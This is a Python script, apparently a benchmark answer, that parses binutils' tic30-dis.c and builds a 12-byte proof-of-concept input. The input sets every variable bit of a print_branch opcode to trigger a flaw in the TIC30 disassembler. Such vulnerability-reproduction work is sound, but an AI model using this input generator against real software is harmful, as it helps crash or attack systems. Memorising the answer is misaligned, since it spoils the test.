import os
import re
import tarfile
import tempfile
import struct
from typing import Dict, Iterable, List, Optional, Tuple


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def _split_c_commas(s: str) -> List[str]:
    out = []
    buf = []
    depth_paren = 0
    depth_brack = 0
    depth_brace = 0
    in_str = False
    in_chr = False
    esc = False
    for ch in s:
        if in_str:
            buf.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            continue
        if in_chr:
            buf.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_chr = False
            continue

        if ch == '"':
            in_str = True
            buf.append(ch)
            continue
        if ch == "'":
            in_chr = True
            buf.append(ch)
            continue

        if ch == "(":
            depth_paren += 1
            buf.append(ch)
            continue
        if ch == ")":
            if depth_paren > 0:
                depth_paren -= 1
            buf.append(ch)
            continue
        if ch == "[":
            depth_brack += 1
            buf.append(ch)
            continue
        if ch == "]":
            if depth_brack > 0:
                depth_brack -= 1
            buf.append(ch)
            continue
        if ch == "{":
            depth_brace += 1
            buf.append(ch)
            continue
        if ch == "}":
            if depth_brace > 0:
                depth_brace -= 1
            buf.append(ch)
            continue

        if ch == "," and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
            out.append("".join(buf).strip())
            buf = []
            continue

        buf.append(ch)

    tail = "".join(buf).strip()
    if tail:
        out.append(tail)
    return out


def _c_expr_to_py(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"\b(0x[0-9a-fA-F]+)[uUlL]+\b", r"\1", expr)
    expr = re.sub(r"\b([0-9]+)[uUlL]+\b", r"\1", expr)
    expr = expr.replace("&&", " and ").replace("||", " or ")
    expr = re.sub(r"!\s*(?!=)", " not ", expr)
    expr = expr.replace("sizeof", "0")
    return expr


def _safe_eval_int(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    py = _c_expr_to_py(expr)
    if re.search(r"[^0-9a-zA-Z_ \t\n\r\(\)\+\-\*/%<>&\|\^~xX]", py):
        return None
    try:
        val = eval(py, {"__builtins__": None}, dict(names))
    except Exception:
        return None
    if isinstance(val, bool):
        val = int(val)
    if not isinstance(val, int):
        return None
    return val


def _popcount32(x: int) -> int:
    return (x & 0xFFFFFFFF).bit_count()


def _iter_files_from_src(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        yield (os.path.relpath(p, src_path), f.read())
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield (m.name, data)
                except Exception:
                    continue
    except Exception:
        return


def _find_tic30_dis_source(src_path: str) -> Optional[str]:
    best_name = None
    best_data = None
    for name, data in _iter_files_from_src(src_path):
        if name.endswith("tic30-dis.c"):
            best_name = name
            best_data = data
            break
    if best_data is None:
        return None
    try:
        return best_data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _parse_defines(text: str) -> Dict[str, int]:
    text = _strip_c_comments(text)
    names: Dict[str, int] = {}
    define_lines = re.findall(r"^[ \t]*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", text, flags=re.MULTILINE)
    pending: Dict[str, str] = {}
    for k, v in define_lines:
        v = v.strip()
        if not v or v.startswith("(") and v.endswith(")"):
            pass
        if "\\" in v:
            v = v.split("\\")[0].strip()
        pending[k] = v

    for _ in range(8):
        progressed = False
        for k, v in list(pending.items()):
            val = _safe_eval_int(v, names)
            if val is not None:
                names[k] = val
                del pending[k]
                progressed = True
        if not progressed:
            break
    return names


def _extract_branch_mask_match(tic30_text: str) -> Optional[Tuple[int, int]]:
    text = _strip_c_comments(tic30_text)
    defines = _parse_defines(tic30_text)

    entries = re.findall(r"\{[^{}]*?print_branch[^{}]*?\}", text, flags=re.DOTALL)
    best = None  # (varbits, mask, match, score)
    for e in entries:
        inner = e.strip()
        if inner.startswith("{") and inner.endswith("}"):
            inner = inner[1:-1].strip()
        parts = _split_c_commas(inner)
        vals: List[int] = []
        for p in parts:
            p2 = p.strip()
            if not p2:
                continue
            if p2.startswith('"') or p2.startswith("'"):
                continue
            if "print_branch" in p2:
                continue
            v = _safe_eval_int(p2, defines)
            if v is None:
                if re.fullmatch(r"[A-Za-z_]\w*", p2) and p2 in defines:
                    v = defines[p2]
            if v is None:
                continue
            vals.append(v)

        cand = [v for v in vals if 0 <= v <= 0xFFFFFFFF and (v.bit_length() >= 12)]
        if len(cand) < 2:
            continue

        cand.sort(key=lambda x: (x.bit_length(), _popcount32(x), x), reverse=True)
        top = cand[:6]

        best_local = None  # (varbits, mask, match, score)
        for i in range(len(top)):
            for j in range(i + 1, len(top)):
                a, b = top[i], top[j]
                for mask, match in ((a, b), (b, a)):
                    mask &= 0xFFFFFFFF
                    match &= 0xFFFFFFFF
                    if (match & mask) != match:
                        continue
                    pc = _popcount32(mask)
                    if pc < 4:
                        continue
                    varbits = 32 - pc
                    score = (varbits * 1000) + pc
                    if best_local is None or (varbits, score) > (best_local[0], best_local[3]):
                        best_local = (varbits, mask, match, score)

        if best_local is None:
            continue
        if best is None or (best_local[0], best_local[3]) > (best[0], best[3]):
            best = best_local

    if best is None:
        return None
    _, mask, match, _ = best
    return mask & 0xFFFFFFFF, match & 0xFFFFFFFF


class Solution:
    def solve(self, src_path: str) -> bytes:
        tic30 = _find_tic30_dis_source(src_path)
        if not tic30:
            return b"\xff" * 12

        mm = _extract_branch_mask_match(tic30)
        if not mm:
            return b"\xff" * 12

        mask, match = mm
        word = (match | ((~mask) & 0xFFFFFFFF)) & 0xFFFFFFFF

        # Endian-robust layout: include both LE and BE encodings back-to-back.
        # Third word provides extra bytes for any extension reads.
        return struct.pack("<I", word) + struct.pack(">I", word) + b"\xff" * 4